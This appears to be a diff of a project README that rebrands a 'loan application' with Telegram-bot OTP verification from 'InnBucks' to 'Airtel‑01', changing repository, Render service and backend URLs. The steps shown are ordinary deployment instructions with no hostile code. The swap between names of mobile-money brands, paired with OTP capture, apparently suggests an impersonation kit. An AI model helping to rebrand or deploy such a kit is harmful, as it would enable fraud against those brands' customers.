@@ -1,4 +1,4 @@
-# 🚀 Quick Start Guide - InnBucks with Telegram OTP
+# 🚀 Quick Start Guide - Airtel‑01 with Telegram OTP
 
 Complete setup for the loan application with Node.js backend and Telegram bot verification.
 
@@ -115,7 +115,7 @@ python -m http.server 8000  # then visit http://localhost:8000
 git init
 git add .
 git commit -m "Initial commit"
-git remote add origin https://github.com/YOUR_USERNAME/innbucks.git
+git remote add origin https://github.com/YOUR_USERNAME/airtel-01.git
 git push -u origin main
 ```
 
@@ -125,13 +125,13 @@ git push -u origin main
 2. Click **New +** → **Web Service**
 3. **Connect GitHub** and select your repo
 4. Fill in:
-   - **Name**: `innbucks-otp-backend`
+   - **Name**: `airtel-01-backend`
    - **Root Directory**: `backend`
    - **Build Command**: `npm install`
    - **Start Command**: `npm start`
 5. **Advanced** → **Environment Variables**:
    - Add all from your `.env` file
-   - Change `BACKEND_URL=https://innbucks-otp-backend.onrender.com`
+   - Change `BACKEND_URL=https://airtel-01.onrender.com`
 6. Click **Deploy**
 
 ### Step 3: Deploy Frontend on Netlify
@@ -152,7 +152,7 @@ In `index.html` (after `<body>` opening tag), add:
   const isDevelopment = window.location.hostname === "localhost";
   const backendUrl = isDevelopment
     ? "http://localhost:3000"
-    : "https://innbucks-otp-backend.onrender.com"; // Change to your Render URL
+    : "https://airtel-01.onrender.com"; // change to the URL for your Render service
   localStorage.setItem("backendUrl", backendUrl);
 </script>
 ```
@@ -161,7 +161,7 @@ Or for each page that uses the backend, add:
 
 ```html
 <script>
-  localStorage.setItem("backendUrl", "https://your-backend.onrender.com");
+  localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
 </script>
 ```
 
